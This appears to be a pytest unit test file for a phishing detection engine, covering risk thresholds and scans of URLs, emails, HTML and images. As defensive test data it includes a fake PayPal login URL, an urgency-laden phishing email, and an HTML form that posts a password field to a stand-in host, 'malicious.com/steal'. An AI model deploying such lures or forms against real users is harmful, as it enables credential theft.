"""
Unit tests for DetectionEngine.
Verifies multi-modal risk scoring, verdict thresholds, and human-readable explanations.
"""

import io
from PIL import Image
import pytest
from backend.detection.engine import DetectionEngine, compute_verdict
from backend.models.schemas import RiskVerdict


class TestDetectionEngine:

    @pytest.fixture
    def engine(self):
        return DetectionEngine()

    def test_compute_verdict_thresholds(self):
        assert compute_verdict(90) == RiskVerdict.CRITICAL
        assert compute_verdict(85) == RiskVerdict.CRITICAL
        assert compute_verdict(75) == RiskVerdict.HIGH
        assert compute_verdict(60) == RiskVerdict.HIGH
        assert compute_verdict(45) == RiskVerdict.MEDIUM
        assert compute_verdict(30) == RiskVerdict.MEDIUM
        assert compute_verdict(20) == RiskVerdict.LOW
        assert compute_verdict(0) == RiskVerdict.LOW

    def test_safe_url_scan(self, engine):
        url = "https://www.wikipedia.org"
        result = engine.scan_url(url)

        assert result.url == url
        assert result.verdict == RiskVerdict.LOW
        assert not result.is_phishing
        assert result.risk_score < 30
        assert "wikipedia.org" in result.explanation.lower() or "benign" in result.explanation.lower()

    def test_phishing_url_scan(self, engine):
        url = "http://192.168.1.100/paypal/login.php?verification=token"
        result = engine.scan_url(url)

        assert result.url == url
        assert result.verdict in [RiskVerdict.HIGH, RiskVerdict.CRITICAL]
        assert result.risk_score >= 60
        assert len(result.heuristic_flags) > 0
        assert result.is_phishing is True

    def test_email_scanning(self, engine):
        subject = "Account Suspension Notice"
        body = "Action required immediately within 24 hours. Update your password at http://192.168.1.100/paypal/login.php"
        result = engine.scan_email(subject, body)

        assert result.risk_score >= 50
        assert result.verdict in [RiskVerdict.MEDIUM, RiskVerdict.HIGH, RiskVerdict.CRITICAL]
        assert result.credential_harvesting_detected is True
        assert len(result.embedded_urls) == 1
        assert "password" in result.explanation.lower() or "urgency" in result.explanation.lower()

    def test_html_scanning(self, engine):
        html = '<form action="http://malicious.com/steal" method="POST"><input type="password" name="pw"/></form>'
        result = engine.scan_html(html, base_url="http://fake-site.top")

        assert result.forms_count == 1
        assert len(result.flags) >= 1
        assert result.risk_score >= 30

    def test_image_scanning(self, engine):
        img = Image.new("RGB", (400, 300), color=(100, 100, 100))
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        bytes_data = buf.getvalue()

        result = engine.scan_image(bytes_data, filename="test_screenshot.png")
        assert result.dimensions["width"] == 400
        assert result.dimensions["height"] == 300
        assert 0 <= result.risk_score <= 100
        assert isinstance(result.verdict, RiskVerdict)
